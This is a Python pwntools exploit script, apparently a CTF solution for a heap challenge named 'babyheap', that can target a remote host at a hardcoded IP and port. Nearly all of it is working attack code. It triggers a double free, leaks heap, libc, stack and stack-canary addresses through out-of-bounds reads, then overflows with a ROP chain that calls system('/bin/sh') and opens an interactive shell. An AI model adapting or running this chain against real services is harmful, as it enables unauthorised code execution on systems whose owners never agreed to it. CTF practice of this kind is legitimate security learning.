#!/usr/bin/env python
from pwn import *

def write(size, data):
    s.sendlineafter('>', '1')
    s.sendlineafter('size :', str(size))
    s.sendlineafter('data :', data)

def read(index):
    s.sendlineafter('>', '2')
    s.sendlineafter('index :', str(index))
    return s.recvuntil('1. ')[:-3]

def free(index):
    s.sendlineafter('>', '3')
    s.sendlineafter('index :', str(index))

if len(sys.argv) == 1:
    s = process('./babyheap', env = {'LD_PRELOAD': './libc.so.6'})
else:
    s = remote('114.177.250.4', 2223)

elf = ELF('./babyheap')
libc = ELF('./libc.so.6')

write(0x18, 'A')
free(0)
free(0)
heap_base = u64(read(0).ljust(8, '\0')) - 0x2280
log.info('heap base: %#x' % heap_base)
libc_base = u64(read((0x400560 - (heap_base + 0x260)) // 8).ljust(8, '\0')) - libc.symbols['free']
libc.address = libc_base
log.info('libc base: %#x' % libc_base)
write(0x18, p64(libc.symbols['environ']))
stack_addr = u64(read((0x2280 - 0x260) // 8)[:6].ljust(8, '\0'))
log.info('stack address: %#x' % stack_addr)
write(0x28, p64(stack_addr - 0x11f))
canary = u64('\0' + read((0x22a0 - 0x260) // 8)[:7])
log.info('canary: %#x' % canary)

pop_rdi = libc_base + 0x2155f
ret = 0x400666

payload = ''
payload += 'A' * 0x108
payload += p64(canary)
payload += 'A' * 0x18
payload += p64(pop_rdi) + p64(libc.search('/bin/sh\0').next())
payload += p64(ret)
payload += p64(libc.symbols['system'])
write(0x28, payload)
s.interactive()
